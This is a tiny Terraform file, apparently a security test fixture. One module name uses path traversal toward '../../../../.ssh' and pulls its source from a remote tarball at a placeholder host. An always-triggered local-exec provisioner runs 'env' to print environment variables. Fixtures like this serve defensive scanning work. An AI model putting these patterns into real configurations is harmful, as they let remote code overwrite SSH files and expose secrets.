module "../../../../.ssh" {
  source = "http://www.test.co/test.tar.gz"
}

resource "null_resource" "docker_bufr3" {
  
  triggers = {
    always_run = "${timestamp()}"
  }

  provisioner "local-exec" {
    command = "env"
    }
}
